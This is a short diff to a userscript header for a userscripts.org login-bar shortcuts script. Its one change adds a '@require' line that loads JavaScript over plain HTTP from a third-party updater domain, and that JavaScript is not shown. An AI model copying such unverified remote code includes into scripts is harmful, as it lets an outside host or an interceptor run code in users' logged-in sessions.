@@ -4,6 +4,7 @@
 // @description    Add's shortcuts links to the login status bar.
 // @include        http://userscripts.org/*
 // @include        https://userscripts.org/*
+// @require        http://updater.usotools.co.cc/105289.js
 // @license        MIT (See file header)
 // @copyright      (c) 2011 Tim Smart
 // ==/UserScript==
